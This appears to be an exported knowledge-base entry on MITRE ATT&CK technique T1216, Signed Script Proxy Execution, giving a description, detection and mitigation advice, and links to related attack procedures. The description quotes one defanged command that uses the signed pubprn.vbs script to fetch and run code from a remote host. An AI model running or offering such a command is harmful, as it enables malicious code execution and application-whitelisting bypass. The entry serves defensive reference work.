---
id: 088a14b4-72a2-46fd-82e5-a4bdc4d0212c
name: Signed Script Proxy Execution
type: technique
mitre_id: T1216
mitre_url: null
created_at: '2019-08-28T21:17:36.025273+00:00'
updated_at: '2023-05-29T16:48:53.672970+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
procedures:
- '[[Linked Database Query Execution]]'
- '[[Linux - SSH Key Predictable PRNG Privilege Escalation]]'
- '[[MSSQL Injection to Grant DBA Access]]'
- '[[MSSQL OLE Automation Command Execution]]'
- '[[Powershell Execution Policy for PowerView Commands]]'
- '[[Ruby Server Side Template Injection - Code Execution]]'
- '[[SMB and HTTP Relay Attack]]'
---

# Signed Script Proxy Execution

**MITRE ID**: T1216

## Description

Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. [1] Example command: cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.pngThere are several other signed scripts that may be used in a similar manner. [2]

# Detection

Monitor script processes, such as cscript, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.

# Mitigation

Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.

# Footnotes

[1] Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.

[2] Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.

[3] Carr, N. (2017, December 22). ItsReallyNick Status Update. Retrieved April 9, 2018.

## Defense

Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these scripts if they are not required for a given system or network to preven

## Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

## Related Procedures (7)

- [[Linked Database Query Execution]]
- [[Linux - SSH Key Predictable PRNG Privilege Escalation]]
- [[MSSQL Injection to Grant DBA Access]]
- [[MSSQL OLE Automation Command Execution]]
- [[Powershell Execution Policy for PowerView Commands]]
- [[Ruby Server Side Template Injection - Code Execution]]
- [[SMB and HTTP Relay Attack]]
